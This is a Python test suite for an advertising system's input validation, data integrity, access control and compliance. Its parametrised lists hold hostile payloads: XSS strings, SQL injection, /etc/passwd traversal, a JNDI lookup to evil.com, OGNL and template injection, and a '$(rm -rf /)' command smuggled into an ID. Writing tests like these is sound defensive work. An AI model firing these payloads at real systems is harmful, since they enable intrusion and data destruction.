"""
🧪 Security and Data Validation Tests for ADS System

Tests to ensure security, data integrity, and input validation
across all system components.
"""

import pytest
import re
from datetime import datetime, timezone, timedelta
from decimal import Decimal
from unittest.mock import patch, Mock
import html
import json
from typing import Any, Dict, List

# Import system components
from domain.entities import Ad, AdCampaign, AdGroup
from domain.value_objects import (
    AdStatus, AdType, Platform, Budget, TargetingCriteria, AdSchedule, AdMetrics
)
from optimization.factory import OptimizationFactory
from optimization.base_optimizer import OptimizationContext, OptimizationStrategy, OptimizationLevel


class TestInputValidation:
    """Tests for input validation and sanitization."""
    
    @pytest.mark.parametrize("malicious_input", [
        "<script>alert('xss')</script>",
        "'; DROP TABLE ads; --",
        "../../../etc/passwd",
        "javascript:alert('xss')",
        "${jndi:ldap://evil.com/x}",
        "{{7*7}}",
        "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}",
        "onload=alert('xss')",
        "<img src=x onerror=alert('xss')>",
        "data:text/html,<script>alert('xss')</script>",
    ])
    def test_ad_name_xss_protection(self, malicious_input):
        """Test that ad names are protected against XSS."""
        try:
            ad = Ad(name=malicious_input)
            
            # Check that dangerous characters are escaped or removed
            assert "<script>" not in ad.name
            assert "javascript:" not in ad.name
            assert "DROP TABLE" not in ad.name.upper()
            assert "onerror=" not in ad.name
            
            # Verify the name is properly sanitized
            serialized = ad.to_dict()
            assert isinstance(serialized['name'], str)
            
        except ValueError:
            # If validation rejects the input, that's also acceptable
            pass
    
    @pytest.mark.parametrize("malicious_description", [
        "<iframe src='javascript:alert(1)'></iframe>",
        "eval('alert(1)')",
        "<object data='data:text/html,<script>alert(1)</script>'></object>",
        "<link rel=stylesheet href=data:,*%7bcolor:red%7d>",
        "<style>@import'data:,*%7bcolor:red%7d';</style>",
    ])
    def test_ad_description_sanitization(self, malicious_description):
        """Test that ad descriptions are properly sanitized."""
        try:
            ad = Ad(
                name="Security Test Ad",
                description=malicious_description
            )
            
            # Check that dangerous elements are removed or escaped
            assert "<iframe>" not in ad.description
            assert "<script>" not in ad.description
            assert "<object>" not in ad.description
            assert "javascript:" not in ad.description
            assert "eval(" not in ad.description
            
        except ValueError:
            # Validation rejection is acceptable
            pass
    
    def test_budget_validation_bounds(self):
        """Test budget validation with boundary values."""
        # Test valid boundaries
        valid_budgets = [
            Decimal('0.01'),  # Minimum
            Decimal('1.00'),
            Decimal('999999.99'),  # Large but reasonable
        ]
        
        for amount in valid_budgets:
            budget = Budget(
                amount=amount,
                currency="USD",
                daily_limit=amount * Decimal('0.1'),
                lifetime_limit=amount
            )
            assert budget.amount == amount
        
        # Test invalid boundaries
        invalid_amounts = [
            Decimal('-1.00'),  # Negative
            Decimal('0.00'),   # Zero
            Decimal('99999999999.99'),  # Too large
        ]
        
        for amount in invalid_amounts:
            with pytest.raises((ValueError, OverflowError)):
                Budget(
                    amount=amount,
                    currency="USD",
                    daily_limit=amount * Decimal('0.1') if amount > 0 else Decimal('1.00'),
                    lifetime_limit=amount if amount > 0 else Decimal('1.00')
                )
    
    def test_targeting_criteria_validation(self):
        """Test targeting criteria validation."""
        # Valid targeting
        valid_targeting = TargetingCriteria(
            age_min=18,
            age_max=65,
            genders=["male", "female"],
            locations=["United States"],
            interests=["technology"]
        )
        assert valid_targeting.age_min == 18
        assert valid_targeting.age_max == 65
        
        # Invalid age ranges
        with pytest.raises(ValueError):
            TargetingCriteria(
                age_min=12,  # Too young
                age_max=65,
                genders=["male"],
                locations=["US"],
                interests=["tech"]
            )
        
        with pytest.raises(ValueError):
            TargetingCriteria(
                age_min=25,
                age_max=150,  # Too old
                genders=["male"],
                locations=["US"],
                interests=["tech"]
            )
        
        with pytest.raises(ValueError):
            TargetingCriteria(
                age_min=45,
                age_max=25,  # Invalid range
                genders=["male"],
                locations=["US"],
                interests=["tech"]
            )
    
    def test_url_validation(self):
        """Test URL validation for ad content."""
        valid_urls = [
            "https://example.com",
            "https://www.example.com/path",
            "https://subdomain.example.com/path?param=value",
            "http://localhost:3000",  # For development
        ]
        
        for url in valid_urls:
            ad = Ad(
                name="URL Test Ad",
                image_url=url,
                destination_url=url
            )
            assert ad.image_url == url
            assert ad.destination_url == url
        
        # Invalid URLs
        invalid_urls = [
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "file:///etc/passwd",
            "ftp://evil.com/malware.exe",
            "//evil.com/redirect",
        ]
        
        for url in invalid_urls:
            with pytest.raises(ValueError):
                Ad(
                    name="Invalid URL Test Ad",
                    image_url=url
                )


class TestDataIntegrity:
    """Tests for data integrity and consistency."""
    
    def test_decimal_precision_consistency(self):
        """Test that decimal values maintain precision."""
        test_amounts = [
            "0.01", "1.23", "999.99", "1000.00",
            "0.001", "0.999", "123.456"
        ]
        
        for amount_str in test_amounts:
            amount = Decimal(amount_str)
            budget = Budget(
                amount=amount,
                currency="USD",
                daily_limit=amount * Decimal('0.1'),
                lifetime_limit=amount
            )
            
            # Serialize and deserialize
            budget_dict = {
                'amount': str(budget.amount),
                'currency': budget.currency,
                'daily_limit': str(budget.daily_limit),
                'lifetime_limit': str(budget.lifetime_limit)
            }
            
            # Reconstruct
            reconstructed_amount = Decimal(budget_dict['amount'])
            assert reconstructed_amount == amount, f"Precision lost for {amount_str}"
    
    def test_unicode_handling(self):
        """Test proper Unicode handling in text fields."""
        unicode_strings = [
            "Hello 世界",  # Chinese
            "Café résumé naïve",  # French accents
            "Москва",  # Cyrillic
            "🚀🎯💡",  # Emojis
            "𝓤𝓷𝓲𝓬𝓸𝓭𝓮",  # Mathematical symbols
            "¡Hola! ¿Cómo estás?",  # Spanish
        ]
        
        for text in unicode_strings:
            ad = Ad(
                name=f"Unicode Test: {text}",
                description=f"Testing Unicode: {text}",
                headline=text,
                body_text=text
            )
            
            # Verify Unicode is preserved
            assert text in ad.name
            assert text in ad.description
            assert ad.headline == text
            assert ad.body_text == text
            
            # Verify serialization preserves Unicode
            ad_dict = ad.to_dict()
            assert text in ad_dict['name']
            assert text in ad_dict['description']
    
    def test_json_serialization_security(self):
        """Test JSON serialization for security issues."""
        ad = Ad(
            name="JSON Security Test",
            description="Testing JSON serialization security"
        )
        
        ad_dict = ad.to_dict()
        
        # Serialize to JSON
        json_str = json.dumps(ad_dict, default=str)
        
        # Verify no dangerous content
        assert "<script>" not in json_str
        assert "javascript:" not in json_str
        assert "__proto__" not in json_str
        assert "constructor" not in json_str
        
        # Verify it can be safely parsed
        parsed = json.loads(json_str)
        assert isinstance(parsed, dict)
        assert parsed['name'] == "JSON Security Test"
    
    def test_id_generation_security(self):
        """Test that ID generation is secure and unpredictable."""
        # Generate many IDs
        ads = [Ad(name=f"ID Test Ad {i}") for i in range(100)]
        ids = [ad.id for ad in ads]
        
        # Check uniqueness
        assert len(ids) == len(set(ids)), "All IDs must be unique"
        
        # Check format (should be UUIDs)
        uuid_pattern = re.compile(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$')
        for id_val in ids:
            assert uuid_pattern.match(str(id_val)), f"ID {id_val} should be a valid UUID"
        
        # Check unpredictability (no sequential patterns)
        id_ints = [int(str(id_val).replace('-', ''), 16) for id_val in ids[:10]]
        differences = [abs(id_ints[i+1] - id_ints[i]) for i in range(len(id_ints)-1)]
        
        # Differences should be large and varied
        assert min(differences) > 1000, "ID differences should be large"
        assert len(set(differences)) > 5, "ID differences should be varied"


class TestAccessControl:
    """Tests for access control and authorization."""
    
    def test_sensitive_field_protection(self):
        """Test that sensitive fields are properly protected."""
        campaign = AdCampaign(
            name="Sensitive Data Test Campaign",
            description="Testing sensitive field protection"
        )
        
        # Serialize campaign
        campaign_dict = campaign.to_dict()
        
        # Check that no sensitive internal fields are exposed
        sensitive_fields = [
            '_internal_id', '_password', '_secret', '_key',
            '_token', '_hash', '_private', '__dict__'
        ]
        
        for field in sensitive_fields:
            assert field not in campaign_dict, f"Sensitive field {field} should not be exposed"
    
    def test_optimization_context_validation(self):
        """Test optimization context validation for security."""
        # Valid context
        valid_context = OptimizationContext(
            target_entity="ad",
            entity_id="test-123",
            optimization_type=OptimizationStrategy.PERFORMANCE,
            level=OptimizationLevel.STANDARD
        )
        
        factory = OptimizationFactory()
        optimal = factory.get_optimal_optimizer(valid_context)
        assert optimal in ["performance", "profiling", "gpu"]
        
        # Test with potentially malicious entity IDs
        malicious_ids = [
            "../../../etc/passwd",
            "'; DROP TABLE ads; --",
            "<script>alert('xss')</script>",
            "$(rm -rf /)",
        ]
        
        for malicious_id in malicious_ids:
            context = OptimizationContext(
                target_entity="ad",
                entity_id=malicious_id,
                optimization_type=OptimizationStrategy.PERFORMANCE,
                level=OptimizationLevel.STANDARD
            )
            
            # Should either work safely or reject the input
            try:
                result = factory.get_optimal_optimizer(context)
                # If it works, verify the ID is sanitized
                assert context.entity_id != malicious_id or len(malicious_id) < 50
            except ValueError:
                # Rejection is acceptable
                pass


class TestErrorHandling:
    """Tests for secure error handling."""
    
    def test_error_message_information_disclosure(self):
        """Test that error messages don't disclose sensitive information."""
        # Test with invalid data that might trigger detailed errors
        try:
            Ad(name="")  # Empty name should trigger validation error
        except Exception as e:
            error_msg = str(e)
            
            # Error message should not contain sensitive info
            sensitive_patterns = [
                r'/[a-zA-Z]*/.*/',  # File paths
                r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}',  # IP addresses
                r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',  # Email addresses
                r'password|secret|key|token',  # Sensitive keywords
            ]
            
            for pattern in sensitive_patterns:
                assert not re.search(pattern, error_msg, re.IGNORECASE), f"Error message contains sensitive info: {error_msg}"
    
    def test_exception_handling_consistency(self):
        """Test that exception handling is consistent and secure."""
        # Test various invalid inputs
        invalid_inputs = [
            {"name": None},
            {"name": ""},
            {"name": " " * 1000},  # Very long string
            {"ad_type": "invalid_type"},
            {"platform": "invalid_platform"},
        ]
        
        for invalid_input in invalid_inputs:
            with pytest.raises((ValueError, TypeError, AttributeError)):
                Ad(**invalid_input)
    
    def test_resource_exhaustion_protection(self):
        """Test protection against resource exhaustion attacks."""
        # Test with very large inputs
        large_string = "A" * 10000  # 10KB string
        
        try:
            ad = Ad(
                name=large_string[:255],  # Should be truncated or validated
                description=large_string[:1000]  # Should be limited
            )
            
            # Verify reasonable limits
            assert len(ad.name) <= 255, "Ad name should be limited in length"
            assert len(ad.description) <= 1000, "Ad description should be limited in length"
            
        except ValueError:
            # Rejection of overly large inputs is acceptable
            pass
        
        # Test with very large number of targeting interests
        try:
            large_interests = [f"interest_{i}" for i in range(1000)]
            targeting = TargetingCriteria(
                age_min=25,
                age_max=45,
                genders=["male"],
                locations=["US"],
                interests=large_interests
            )
            
            # Should either limit the list or reject it
            assert len(targeting.interests) <= 100, "Interests list should be limited"
            
        except ValueError:
            # Rejection is acceptable
            pass


class TestComplianceValidation:
    """Tests for compliance and regulatory validation."""
    
    def test_age_targeting_compliance(self):
        """Test age targeting compliance with regulations."""
        # Test minimum age compliance (e.g., COPPA compliance)
        with pytest.raises(ValueError):
            TargetingCriteria(
                age_min=10,  # Below minimum legal age for advertising
                age_max=18,
                genders=["male", "female"],
                locations=["United States"],
                interests=["toys"]
            )
        
        # Valid adult targeting
        adult_targeting = TargetingCriteria(
            age_min=18,
            age_max=65,
            genders=["male", "female"],
            locations=["United States"],
            interests=["business"]
        )
        assert adult_targeting.age_min >= 18
    
    def test_content_policy_compliance(self):
        """Test content policy compliance."""
        # Test prohibited content detection
        prohibited_content = [
            "Buy prescription drugs without prescription",
            "Get rich quick scheme guaranteed",
            "Adult content explicit material",
            "Hate speech targeting minorities",
            "Fake news coronavirus cure",
        ]
        
        for content in prohibited_content:
            try:
                ad = Ad(
                    name="Policy Test Ad",
                    description=content,
                    body_text=content
                )
                
                # If creation succeeds, content should be flagged or sanitized
                # In a real system, this would trigger content moderation
                
            except ValueError:
                # Rejection is expected for policy violations
                pass
    
    def test_privacy_compliance(self):
        """Test privacy compliance (GDPR, CCPA, etc.)."""
        # Test that no PII is accidentally stored
        campaign = AdCampaign(
            name="Privacy Test Campaign",
            description="Testing privacy compliance"
        )
        
        campaign_dict = campaign.to_dict()
        
        # Check for potential PII patterns
        pii_patterns = [
            r'\b\d{3}-\d{2}-\d{4}\b',  # SSN pattern
            r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b',  # Credit card pattern
            r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # Email pattern
        ]
        
        campaign_str = json.dumps(campaign_dict, default=str)
        
        for pattern in pii_patterns:
            matches = re.findall(pattern, campaign_str)
            assert len(matches) == 0, f"Potential PII detected: {matches}"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])

